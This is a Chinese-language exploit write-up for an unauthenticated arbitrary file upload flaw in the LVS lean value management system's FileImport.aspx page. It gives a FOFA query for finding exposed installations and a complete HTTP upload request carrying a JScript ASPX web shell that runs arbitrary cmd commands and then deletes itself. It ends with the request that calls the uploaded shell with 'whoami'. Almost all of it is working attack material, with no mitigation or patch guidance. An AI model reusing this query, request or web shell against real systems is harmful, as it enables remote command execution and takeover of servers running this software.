# LVS精益价值管理系统FileImport存在任意文件上传

# 一、漏洞简介
LVS精益价值管理系统存在未授权文件上传漏洞，可以获取服务器权限


# 二、资产测绘
+ fofa
```
body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
```

# 三、漏洞复现
```
POST /Business/FileImport.aspx HTTP/1.1
Host: 
Content-Length: 2743
Cache-Control: max-age=0
Origin: http://171.111.196.128:8031
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3yAQlBeBktTvYBYI
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:8031/Business/FileImport.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: liger-home-tab=%5B%7B%22tabid%22%3A%22menu1288%22%2C%22text%22%3A%22%E6%8A%80%E6%9C%AF%E7%89%A9%E6%96%99%E9%85%8D%E7%BD%AE%22%2C%22url%22%3A%22DataConfig%2FJSMaterialBaseList.aspx%22%7D%5D; ASP.NET_SessionId=woqqjcmyyvsqnfyhlisgqaz3
Connection: close

------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="TimeStamps"


------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="PKID"

-1
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="HGUID"

51237042-770e-4193-8f46-ba658acd3403
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="DETAILKEYIDS"


------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="_pageurl_"

FileImport.aspx
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="__CURRENT_USERINFO__"

技术部/管理员
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="__CURRENT_USERNAME__"

管理员
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="__CURRENT_USERID__"

62
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="__DATA_CONDITION__"


------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="userRights"

100100000000000000000
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTQ4ODU5NTg1Nw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkIUpK8wT96Udg9SJMYk5wlAX+k0e1wb0mWv2Tj0D3RGs=
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

9B828D4B
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEdAATBKOA59lA/ELZO4C20kl7t5vhDofrSSRcWtmHPtJVt4HDaKDpfWtsN2eLRTytayxBJeqIUJtiPpteHo1eRLLL6arQSyqM6kYk3gaBmMbYviSwTP9NmVm1E1kqLBautY40=
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="excelFile"; filename="2.aspx"
Content-Type: application/xml

<%@ Page Language="Jｓｃｒｉｐｔ" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="btnUpload"

上传
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="OWNERID"

<%=CurrentUser.UserID%>
------WebKitFormBoundary3yAQlBeBktTvYBYI
Content-Disposition: form-data; name="OWNERNAME"

<%=CurrentUser.Name%>
------WebKitFormBoundary3yAQlBeBktTvYBYI--
```
# 访问地址
```
POST /UploadFile/ca953af7-6496-45b9-8f4f-79499ca621cb.aspx?cmd=whoami HTTP/1.1
Host: 
Content-Length: 260
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
```
